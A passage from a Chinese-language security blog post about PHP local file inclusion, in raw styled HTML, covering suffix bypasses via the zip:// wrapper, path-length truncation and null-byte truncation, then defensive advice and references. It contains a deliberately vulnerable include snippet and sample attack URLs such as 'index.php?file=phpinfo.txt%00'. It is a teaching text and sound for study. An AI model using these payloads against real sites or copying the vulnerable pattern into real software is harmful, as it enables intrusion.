2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">/test/test.php</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">，也就是指定的后缀被当作fragment从而被绕过。注意需要把</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">#</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">进行url编码为</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">%23</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">。</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/20.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/20.png" height="198" width="1245"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">利用协议</span></h3><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">前面有提到过利用zip协议和phar协议。假设现在测试代码为：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">2</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">3</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">4</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">&lt;?php</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">    $file = $_GET[</span><span style="font-size: 13px; color: rgb(153, 204, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">'file'</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">];</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">    </span><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">include</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;"> $file.</span><span style="font-size: 13px; color: rgb(153, 204, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">'/test/test.php'</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">;</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">?&gt;</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">构造压缩包如下：</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/21.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/21.png" height="103" width="726"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">其中test.php内容为：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">&lt;?php phpinfo(); ?&gt;</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用zip协议，注意要指定绝对路径</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=zip://D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/22.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/22.png" height="257" width="927"/><br/></a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">能成功包含。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">在利用phar协议的时候有些问题。哪位能指教一下？</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/23.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/23.png" height="274" width="1318"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">长度截断</span></h3><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用条件： php版本 &lt; php 5.2.8</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">./</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=././././。。。省略。。。././shell.txt</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">则后缀</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">/test/test.php</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">，在达到最大值后会被直接丢弃掉。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">0字节截断</span></h3><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用条件： php版本 &lt; php 5.3.4</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=phpinfo.txt%00</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/24.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/24.png" height="241" width="1057"/><br/></a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">能利用00截断的场景现在应该很少了：）</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h1 style="font-size: 22px; margin: 0px; padding: 0px;"><span style="font-size: 22px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">防御方案</span></h1><ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">做好文件的权限管理</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">对危险字符进行过滤等等</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div></ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h1 style="font-size: 22px; margin: 0px; padding: 0px;"><span style="font-size: 22px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">Refference</span></h1><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">《白帽子讲Web安全》</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><a href="https://dustri.org/b/from-lfi-to-rce-in-php.html" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">From LFI to RCE in php </a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">l3m0n: 文件包含漏洞小结</a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><a href="https://highon.coffee/blog/lfi-cheat-sheet/" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">LFI Cheat Sheet</a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><a href="https://github.com/lucyoa/ctf-wiki/tree/master/web/file-inclusion" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">Local File Inclusion</a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"


      
    /></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
	/></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
      
        
/></div><div style="width: 85%; max-width: 45em; margin: 2.8em auto 0px; padding: 0.5em 1em; border: 1px solid rgb(211, 211, 211); font-size: 0.93rem; word-break: break-all; background-color: rgba(255, 255, 255, 0.4); background-position: initial initial; background-repeat: initial initial;"><div><span style="font-size: 0.93rem; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 1.6em;"
  
  
  
  
  
  /></div><div style="margin: 0px;"><span style="display: inline-block; width: 5.2em; font-size: 0.93rem; color: rgb(181, 181, 181); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.6em;">本文标题:</span><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" style="background-color: transparent; word-wrap: break-word; border-bottom-width: 0px; font-size: 0.93rem; color: rgb(128, 128, 128); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 1.6em; text-decoration: none;">php文件包含漏洞</a></div><div><span style="font-size: 0.93rem; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 1.6em;"
  /></div><div style="margin: 0px;"><span style="display: inline-block; width: 5.2em; font-size: 0.93rem; color: rgb(181, 181, 181); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.6em;">文章作者:</span><a href="https://chybeta.github.io/" title="访问 chybeta 的个人博客" style="background-color: transparent; word-wrap: break-word; border-bottom-width: 0px; font-size: 0.93rem; color: rgb(128, 128, 128); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 1.6em; text-decoration: none;">chybeta</a></div><div><span style="font-size: 0.93rem; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 1.6em;"
